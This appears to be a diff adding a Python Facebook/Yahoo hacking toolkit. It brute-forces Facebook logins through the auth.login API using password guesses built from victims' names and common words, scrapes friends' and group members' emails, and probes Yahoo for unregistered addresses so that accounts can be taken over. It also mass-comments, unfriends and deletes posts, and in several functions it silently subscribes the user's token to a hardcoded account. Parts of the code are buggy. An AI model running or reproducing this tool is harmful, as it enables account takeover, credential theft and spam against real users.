+                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+
+                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print('['+R+'CP'+k+'] > '+ user + ' | ' + pass4)
+                                        else:
+                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+
+                                                print('['+h+'OK'+k+'] > ' + user + ' | sayang')
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print('['+R+'CP'+k+'] > ' + user + ' | sayang')
+                                                else:
+                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=doraemon&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                    d  = json.load(data)
+                                                    if 'access_token' in q:
+
+                                                        print('['+h+'OK'+k+'] > ' + user + ' | doraemon')
+                                                    else:
+                                                        if 'www.facebook.com' in q['error_msg']:
+                                                            print('['+R+'CP'+k+'] > '+ user + ' | doraemon')
+                                                        else:
+                                                            pass5 = b['first_name']+'12'
+                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                            q = json.load(data)
+                                                            if 'access_token' in q:
+
+                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass5)
+                                                            else:
+                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                    print('['+R+'CP'+k+'] > '+ user + ' | ' + pass5)
+                                                                else:
+                                                                    pass6 = b['last_name']+'45'
+                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                    q = json.load(data)
+                                                                    if 'access_token' in q:
+
+                                                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass6)
+                                                                    else:
+                                                                        if 'www.facebook.com' in q['error_msg']:
+                                                                            print('['+R+'CP'+k+'] > '+ user + ' | ' + pass6)
+        except:
+            pass
+    p = ThreadPool(30)
+    p.map(lef,ibb)
+    print('[+] Selesai')
+    input('[+] Press [Enter] to return ')
+    mbf()
+def keluar():
+    tik(h + 'Thanks for using this tools\nHave a nice day ^‿^')
+    exit()
+def login():
+    try:
+        os.system('clear')
+        open('cookie/login.txt', 'r').read()
+        os.system('clear')
+        logo()
+        print(s)
+        print(a)
+        menu()
+    except FileNotFoundError:
+        logo1()
+        toket()
+    except requests.exceptions.ConnectionError:
+        tik(R+'[!] Connection Error'+k)
+def ID():
+    os.system('clear')
+    try:
+        os.mkdir('.data')
+    except:
+        pass
+    logo1()
+    print(a)
+    n = input(R+'[!] '+k+'Input Your Name : '+h)
+    p = str(uuid.uuid4())
+    x = p.split("-")
+    b = x[4]+'19'
+    print(R+'[!]',k+'Your Machine ID : '+h+p)
+    print(R+'[!]'+k+' To continue you must first confirm your ID')
+    print(R+'[!] '+k+'It is Free')
+    r = input(R+'[!] '+k+'Press [Enter] To Confirm ')
+    if r == '':
+        os.system('xdg-open https://wa.me/6285268345036?text=Hello%20Admin,%20I%20Want%20To%20Confirm%20My%20ID.%20My%20ID%20:%20'+p)
+    else:
+        exit(k+'=========['+R+' E X I T'+k+' ]=========')
+    op = input(R+'[!] '+k+'Input Your ID Confirmed : '+h)
+    if op == '':
+        os.system('rm -rf .data')
+        exit(k+'=========['+R+' E X I T'+k+' ]=========')
+    elif op == b:
+        m = open('.data/name','w')
+        m.write(n)
+        m.close
+        o = open('.data/user','w')
+        o.write(op)
+        o.close
+        login()
+    else:
+        exit(k+'=========['+R+' E X I T'+k+' ]=========')
+def log():
+    try:
+        open('.data/user','r').read()
+    except FileNotFoundError:
+        ID()
+    try:
+        toket=open('cookie/login.txt','r').read()
+        nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
+        lol = json.loads(nam.text)
+        note = lol['name']
+    except KeyError:
+        logo1()
+        print('[!] Account Has Been Checkpoint')
+        os.remove('cookie/login.txt')
+        input('[!] Press [Enter] to generate access token ')
+        toke()
+    except requests.exceptions.ConnectionError:
+        logo1()
+        print(R+'                   No connection!'+k)
+        print(a)
+        exit(k+'                    ['+R+'E X I T'+k+'] ').center()
+    except FileNotFoundError:
+        logo1()
+        print(t)
+        print(a)
+        toke()
+    os.system('clear')
+    try:
+        logo1()
+        print(a)
+        m = open('.data/user','r').read()
+        l = open('.data/name','r').read()
+        print(R+'[!] '+k+'Username : '+h+l)
+        print(R+'[!] '+k+'ID       : '+h+m)
+        input(R+'[!] '+h+'Press [Enter] to continue '+k)
+        os.system('xdg-open https://instagram.com/_asmin19')
+        login()
+    except FileNotFoundError:
+        ID()
+def mbot():
+    os.system('clear')
+    logo()
+    print('                     Bot Facebook')
+    print(a)
+    print('''    [ 01 ] Create Status
+    [ 02 ] Unfriend
+    [ 03 ] Delete Post
+    [ 04 ] Group Comment
+    [ 05 ] Home Comment
+    [ 06 ] Accept Requests
+    [ 00 ] Back
+    ''')
+    inp = input('[#] Choice'+k+'/'+R+'~'+k+'> ')
+    if inp == '':
+        print('[!] Please Enter your choice')
+        input('[!] Press [Enter] to return ')
+        mbot()
+    elif inp in ['1','01']:
+        status()
+    elif inp in ['2','02']:
+        unfriend()
+    elif inp in ['3','03']:
+        delpost()
+    elif inp in ['4','04']:
+        Gkom()
+    elif inp in ['5','05']:
+        home()
+    elif inp in ['6','06']:
+        req()
+    elif inp in ['0','00']:
+        login()
+    else:
+        print('[!] Wrong Input ')
+        input('[!] Press [Enter] to return ')
+        mbot()
+def Gkom():
+    print(a)
+    try:
+        print('[!] Load access token')
+        toket=open('cookie/login.txt','r',).read()
+    except FileNotFoundError:
+        print('[!] Token Not Found')
+        input('[!] Press [Enter] to generate access token ')
+        toke()
+    print("["+R+"NOTE"+k+"] Type '</>' for newlines")
+    msg=input("[?] comment: "+h)
+    if msg == '':
+        exit(R+"[!] Y O U   S T U P P I D ")
+    ms=msg.replace('</>','\n')
+    id1 = []
+    def main(arg):
+        try:
+            requs = requests.get('https://graph.facebook.com/'+arg+'/feed?limit=5&access_token='+toket)
+            res = json.loads(requs.text)
+            for i in res['data']:
+                id1.append(i['id'])
+                print("\r[get] Post ID : %s  "%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.001)
+        except KeyError:
+            exit('[!] Something wrong ')
+    try:
+        idx = []
+        toket=open('cookie/login.txt','r',).read()
+        req = requests.get('https://graph.facebook.com/me/groups?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
+        rem = json.loads(req.text)
+        for o in rem['data']:
+            idx.append(o['id'])
+    except KeyError:
+        exit('[!] Keluar')
+    except ConnectionError:
+        tik('[!] Connection Error')
+    T=ThreadPool(5)
+    T.map(main,idx)
+    print("\n[!] S T A R T ")
+    le=len(id1)
+    co=int(0)
+    while co < le:
+        for i in range(le):
+            co+=1
+            par = {'access_token' : toket, 'message' : ms}
+            pt=requests.post('https://graph.facebook.com/'+str(id1[i])+'/comments',data=par)
+            post=json.loads(pt.text)
+            if 'error' in str(post):
+                print(k+'[×] '+o['name']+R+' FAILED')
+            else:
+                print(k+'[+] '+o['name']+h+' SUCCESS')
+            if co == le:
+                break
+    print(a)
+    print(R+'[✔] D O N E')
+    input(k+'[+] Press [Enter] to return ')
+    mbot()
+def home():
+    print(a)
+    try:
+        toket=open('cookie/login.txt','r').read()
+    except FileNotFoundError:
+        print('[!] Token not found ')
+        input('[!] Press [Enter] to generate access token ')
+        toke()
+    print(k+"["+R+'NOTE'+k+"] type '</>' for newlines")
+    msg=input("[?] comment: ")
+    if msg == '':
+        input("[!] Please write comment ")
+        home()
+    ms=msg.replace('</>','\n')
+    id=[]
+    toket=open('cookie/login.txt','r').read()
+    req = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50000)&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
+    result = json.loads(req.text)
+    for i in result['home']['data']:
+        id.append(i['id'])
+        print('\r[get] Post ID %s '%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.001)
+    print("\n[!] S T A R T ")
+    def main(arg):
+        pt=requests.post("https://graph.facebook.com/"+arg+"/comments?message="+ms+"&access_token="+toket)
+        post=json.loads(pt.text)
+        if 'error' in str(post):
+            print(k+'['+R+'FAILED'+k+'] '+arg)
+        else:
+            print(k+'['+h+'SUCCESS'+k+'] '+arg)
+    T=ThreadPool(10)
+    T.map(main,id)
+    print(a)
+    print(h+"[✔] D O N E ")
+    input(k+'[+] Press [Enter] to return ')
+    mbot()
+def status():
+    print(a)
+    print(k+"["+R+'NOTE'+k+"] type '</>' for newlines")
+    try:
+        toket=open('cookie/login.txt','r').read()
+    except IOError:
+        print("[!] Token not found")
+        token()
+    msg=input('[?] Type status : '+k)
+    if msg == "":
+        print(R+"[!] Don't be empty")
+        input(k+"[ Back ]")
+        login()
+    else:
+        try:
+            ms=msg.replace('</>','\n')
+            res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+ms+"&access_token="+toket)
+            pm = json.loads(res.text)
+            tik('[+] Create...')
+            print("[+] Status ID : "+pm['id'])
+            print(h+'[✔] Success write status')
+            print(a)
+            input("[ Back ]")
+            mbot()
+        except KeyError:
+            print(R+'[!] Failed')
+            print('[!] Something Wrong')
+            input(k+'[!] Press [Enter] to return ')
+            mbot()
+def unfriend():
+    print(a)
+    print('''    [ 01 ] All User
+    [ 02 ] Based Gender
+    [ 00 ] Back
+    ''')
+    poll = input('[#] Unfriend/~> ')
+    if poll =='':
+        print('[!] Please Enter your choice')
+        input('[!] Press [Enter] to return ')
+        unfriend()
+    elif poll in ['1','01']:
+        allus()
+    elif poll in ['2','02']:
+        bas()
+    elif poll in ['0','00']:
+        mbot()
+    else:
+        print('[!] Wrong input')
+        input('[!] Press [Enter] to return ')
+        unfriend()
+def allus():
+    print(a)
+    tik('[!]'+R+'  U N'+n+' - '+R+'F R I E N D  '+k+' A L L   U S E R '+k)
+    try:
+        toket=open('cookie/login.txt','r').read()
+        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        lol = json.loads(nam.text)
+        nama = lol['name']
+    except FileNotFoundError:
+        print("[!] Token not found\n[!] Press [Enter] to generate access token")
+        os.system('rm -rf cookie/login.txt')
+        sleep(1)
+        login()
+    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
+    print('[?] Press [CTRL + C] to aborting')
+    tik('[!] Start....')
+    print(a)
+    try:
+        lol = []
+        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+        cok = json.loads(pek.text)
+        for i in cok['data']:
+            nm = i['name']
+            lol.append(i['id'])
+            im = i['id']
+            requests.delete("https://graph.facebook.com/me/friends?uid="+im+"&access_token="+toket)
+            print("["+R+str(len(lol))+k+"] "+h+nm+k+' ['+R+'UNFRIENDED'+k+']')
+    except IndexError: pass
+    except KeyboardInterrupt:
+        print("[!] Stopped\n")
+        input("   [ Back ]")
+        login()
+    except requests.exceptions.ConnectionError:
+        exit('[!] Check Your Connection ')
+    print("[+] Done")
+    input("[ Back ]")
+    login()
+def bas():
+    print(a)
+    tik(k+'[!]'+R+' U N F R I E N D'+n+' - '+k+'B A S E D   G E N D E R ')
+    try:
+        toket=open('cookie/login.txt','r').read()
+        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        lol = json.loads(nam.text)
+        nama = lol['name']
+    except IOError:
+        print("[!] Token not found")
+        os.system('rm -rf cookie/login.txt')
+        sleep(1)
+        login()
+    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
+    ugen=input('[?] Gender F/M: ')
+    if ugen == 'F' or ugen == 'f':
+        gen = 'female'
+    elif ugen == 'M' or ugen == 'm':
+        gen = 'male'
+    else:
+        print('STUPID!')
+    print('[?] Press [CTRL + C] to aborting')
+    tik('[!] Start....')
+    print(a)
+    try:
+        lon = []
+        req = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+        tok = json.loads(req.text)
+        for i in tok['data']:
+            lon.append(i['id'])
+            try:
+                ref = requests.get('https://graph.facebook.com/'+i['id']+'?access_token=' + toket)
+                res = json.loads(ref.text)
+                if gen == res['gender']:
+                    unf = requests.delete("https://graph.facebook.com/me/friends?uid="+i['id']+"&access_token="+toket)
+                    if unf.text == 'true':
+                        print(k+"["+R+str(len(lon))+k+"] "+res['name']+k+' - ['+h+'SUCCESS'+k+']')
+                    else:
+                        print(k+"["+R+str(len(lon))+k+"] "+res['name']+k+' - ['+R+'FAILED'+k+'] ')
+            except KeyError:
+                print(f"[Failed] {i['id']} - (unknow)")
+    except KeyError:
+        exit('hhhh')
+def req():
+    print(a)
+    tik('['+h+' A C C E P T   R E Q U E S T S '+k+']')
+    print('')
+    try:
+        toket=open('cookie/login.txt','r').read()
+        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        lol = json.loads(nam.text)
+        nama = lol['name']
+    except FileNotFoundError:
+        print('[!] Token not found')
+        input('[!] Press [Enter] to generate access token')
+        toke()
+    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
+    lov = []
+    s = requests.Session()
+    print(a)
+    tik('[✔] START...')
+    r = s.get('https://graph.facebook.com/me/friendrequests?limit=5000&access_token='+toket);s.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
+    res = json.loads(r.text)
+    if '[]' in str(res['data']):
+        print("[!] no friends requests")
+        input('[!] Press [Enter] to return ')
+        mbot()
+    for i in res['data']:
+        re = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['from']['id'],toket))
+        b  = json.loads(re.text)
+        if 'error' in str(b):
+            print(R+"[x] "+k+i['from']['name']+R+' - FAILED ')
+        else:
+            print(k+"[✔] "+k+i['from']['name']+h+" - CONFIRMED")
+    print(k,a)
+    print('[✔] DONE ')
+    input('[✔] Press [Enter] to return ')
+    mbot()
+def dyah():
+    em = []
+    try:
+        tik('[!] Load Token....')
+        toket=open('cookie/login.txt','r').read()
+        print('[✔] Token Founded')
+    except FileNotFoundError:
+        print('[!] Token not found')
+        input('[!] Press [Enter] to return ')
+        toke()
+    try:
+        r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+        a = json.loads(r.text)
+        for i in a['data']:
+            olx=open('dump/Ymail.txt','a')
+            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+            z = json.loads(x.text)
+            try:
+                em.append(z['email'])
+                if '@yahoo' in z['email']:
+                    olx=open('dump/Ymail.txt','a')
+                    olx.write(z['email'])
+                    olx.close()
+                    print(k+"[Yahoo] "+z['email'] +' - '+h+z['name'])
+            except:
+                pass
+        print("""[FILE SAVED]
+            Yahoo: dump/Ymail.txt""")
+    except requests.exceptions.ConnectionError:
+        exit('[ CHECK YOUR CONNECTION ]')
+def delpost():
+    print(a)
+    try:
+        toket=open('cookie/login.txt','r').read()
+        na = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
+        lol = json.loads(na.text)
+        nama = lol['name']
+    except IOError:
+        print("[!] Token not found")
+        os.system('rm -rf cookie/login.txt')
+        sleep(1)
+        login()
+    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
+    print('[!] Ctrl + d to abort ')
+    tik("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
+    print(a)
+    asu = requests.get('https://graph.facebook.com/me/feed?&access_token='+toket)
+    asus = json.loads(asu.text)
+    for p in asus['data']:
+        id = p['id']
+        piro = 0
+        url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
+        ok = json.loads(url.text)
+        try:
+            error = ok['error']['message']
+            print('\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed')
+        except TypeError:
+            print('\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted')
+            piro += 1
+        except requests.exceptions.ConnectionError:
+            print("\033[1;91m[!] Connection Error")
+            input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+            mbot()
+    print("\033[1;91m [✓] \033[1;92mDone")
+    input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+    mbot()
+def clone():
+    os.system('clear')
+    logo()
+    print('                Yahoo clone ')
+    print(a)
+    print('''    [ 01 ] Friends
+    [ 02 ] From Friends
+    [ 03 ] From Group
+    [ 04 ] From File
+    [ 05 ] Dump Yahoo
+    [ 00 ] Back
+    ''')
+    yah = input(R+'[#]'+n+' Asmin'+k+'/'+n+'Yahoo'+k+'/'+R+'~'+k+'> ')
+    if yah =='':
+        print('[!] Please input your choice ')
+        input('[!] Press [Enter] to return ')
+        clone()
+    elif yah in ['1','01']:
+        friend()
+    elif yah in ['2','02']:
+        fr_friend()
+    elif yah in ['3','03']:
+        fr_grub()
+    elif yah in ['4','04']:
+        fil()
+    elif yah in ['5','05']:
+        dyah()
+    elif yah in ['0','00']:
+        login()
+    else:
+        print('[!] Wrong input')
+        input('[!] Press [Enter] to return ')
+        clone()
+def friend():
+        print(a)
+        try:
+            toket=open('cookie/login.txt','r').read()
+        except IOError:
+                print("\033[1;91m[!] Token not found")
+                os.system('rm -rf cookie/login.txt')
+                time.sleep(1)
+                toke()
+        try:
+                os.mkdir('clone')
+        except OSError:
+                pass
+        mpsh = []
+        jml = 0
+        tik('[!] Getting email friend...')
+        teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+        br = mechanize.Browser()
+        br.set_handle_robots(False)
+        kimak = json.loads(teman.text)
+        for i in kimak['data']:
+            try:
+               em = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+               mail = json.loads(em.text)
+               for o in mail['data']:
+                   yah = o['mail']
+            except KeyError:
+                continue
+            if ('yahoo.com' in yah):pass
+            else: continue
+            br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+            br._factory.is_html = True
+            br.select_form(nr=0)
+            br["username"] = (em)
+            soup = BeautifulSoup(br.submit().read(), features="html.parser")
+            status = soup.find_all("p")
+            vuln = ("\033[31mNot Vuln")
+            for p in status:
+                try:
+                    if (p.get("data-error") == "messages.ERROR_INVALID_USERNAME"):
+                        vuln = ("\033[32mVuln")
+                        break
+                except:
+                    pass
+            len_email = (27-len(em))
+            if (vuln == "\033[32mVuln"):
+                len_vuln = (19-(len(vuln)-8))
+                if (vuln == "\033[32mVuln"):
+                    len_vuln = (19-(len(vuln)-8))
+                    print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-10)*" "+vuln+(len_vuln-10)*" "+"\033[36m|")
+                else:
+                    len_vuln = (19-(len(vuln)-8))
+                    print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-7)*" "+vuln+(len_vuln-9)*" "+"\033[36m|")
+        print('[✔] Done ')
+        print("[+] Total : "+str(len(berhasil)))
+        print("[+] File saved : clone/friends.txt")
+        save.close()
+        input('[+] Press [Enter] to return ')
+        clone()
+def fr_grub():
+    print(a+k)
+    try:
+        toket=open('cookie/login.txt','r').read()
+    except IOError:
+        print("\033[1;91m[!] Token not found")
+        os.system('rm -rf cookie/login.txt')
+        time.sleep(1)
+        toke()
+    try:
+        os.mkdir('clone')
+    except OSError:
+        pass
+    mpsh = []
+    jml = 0
+    id=input('[?] Input ID group : ')
+    try:
+        r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+        asw=json.loads(r.text)
+        print("[+] From group : "+asw['name'])
+    except KeyError:
+        print("[!] Group not found")
+        input('[!] Press [Enter] to return ')
+        clone()
+    tik('[+] Getting email from group...')
+    teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+    kimak = json.loads(teman.text)
+    save = open('clone/fromgroup','a')
+    tik('[+] Start...')
+    for w in kimak['data']:
+        jml +=1
+        mpsh.append(jml)
+        id = w['id']
+        nama = w['name']
+        links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+        z = json.loads(links.text)
+        try:
+            print('[!] Try pertama ')
+            mail = z['email']
+            yahoo = re.compile(r'@.*')
+            otw = yahoo.search(mail).group()
+            if 'yahoo.com' in otw:
+                print('[otw]> '+otw)
+                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+                br._factory.is_html = True
+                br.select_form(nr=0)
+                br["username"] = mail
+                klik = br.submit().read()
+                print('[klik] '+klik)
+                jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+                try:
+                    print('[!] try kedua')
+                    pek = jok.search(klik).group()
+                except:
+                    print('[!] except kedua')
+                    continue
+                if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                    save.write(mail + '\n')
+                    print('['+h+'VULN'+k+']' +mail+'|'+nama)
+                    berhasil.append(mail)
+        except KeyError:
+            print('[!] Except pertama')
+            pass
+    print('[✓] Done....')
+    print("[+] Total : "+str(len(berhasil)))
+    print("[+] File saved : clone/fromgroup.txt")
+    save.close()
+    input('[+] Press [Enter] to return ')
+    clone()
+def fil():
+    print(a)
+    try:
+        toket=open('cookie/login.txt','r').read()
+    except IOError:
+        print("\033[1;91m[!] Token not found")
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        toke()
+    try:
+        os.mkdir('clone')
+    except OSError:
+        pass
+    files = input("[+] File path : ")
+    try:
+        total = open(files,"r")
+        mail = total.readlines()
+    except IOError:
+        print("[!] File not found")
+        input('[!] Press [Enter] to return ')
+        clone()
+    mpsh = []
+    jml = 0
+    tik('Start...')
+    save = open('clone/file.txt','a')
+    mail = open(files,"r").readlines()
+    for pw in mail:
+        mail = pw.replace("\n","")
+        jml +=1
+        mpsh.append(jml)
+        yahoo = re.compile(r'@.*')
+        otw = yahoo.search(mail).group()
+        if 'yahoo.com' in otw:
+            br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+            br._factory.is_html = True
+            br.select_form(nr=0)
+            br["username"] = mail
+            klik = br.submit().read()
+            jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+            try:
+                pek = jok.search(klik).group()
+            except:
+                continue
+            if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                save.write(mail + '\n')
+                print('['+h+'VULN'+k+']' +mail+'|'+nama)
+                berhasil.append(mail)
+        print('[✓] Done')
+        print("[+] Total : "+ str(len(berhasil)))
+        print("[+] File saved : clone/file.txt")
+        save.close()
+        input('[+] Press [Enter] to return ')
+        clone()
+def fr_friend():
+    print(a)
+    try:
+        toket=open('cookie/login.txt','r').read()
+    except IOError:
+        print("[!] Token not found")
+        os.system('rm -rf cookie/login.txt')
+        time.sleep(1)
+        toke()
+    try:
+        os.mkdir('clone')
+    except OSError:
+        pass
+    mpsh = []
+    jml = 0
+    idt = input("[+] Input ID friend : ")
+    try:
+        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+        op = json.loads(jok.text)
+        print('[✓] Clone From '+op["name"])
+    except KeyError:
+        print("[!] Friend not found")
+        input("Press [Enter] ti return ")
+        clone()
+    tik('[+] Getting email from friend...')
+    teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+    kimak = json.loads(teman.text)
+    save = open('clone/fromfriend.txt','a')
+    tik('[+] Start...')
+    for w in kimak['data']:
+        jml +=1
+        mpsh.append(jml)
+        id = w['id']
+        nama = w['name']
+        links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+        z = json.loads(links.text)
+        try:
+            mail = z['email']
+            yahoo = re.compile(r'@.*')
+            otw = yahoo.search(mail).group()
+            if 'yahoo.com' in otw:
+                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+                br._factory.is_html = True
+                br.select_form(nr=0)
+                br["username"] = mail
+                klik = br.submit().read()
+                jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+                try:
+                    pek = jok.search(klik).group()
+                except:
+                    continue
+                if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                    save.write(mail + '\n')
+                    print('['+h+'VULN'+k+']' +mail+'|'+nama)
+                    berhasil.append(mail)
+        except KeyError:
+            pass
+    print('[✓] Done ')
+    print("[+] Total : "+str(len(berhasil)))
+    print("[+] File saved : clone/fromfriend.txt")
+    save.close()
+    input('[+] Press [Enter] to return ')
+    clone()
+if __name__ == '__main__':
+    log()
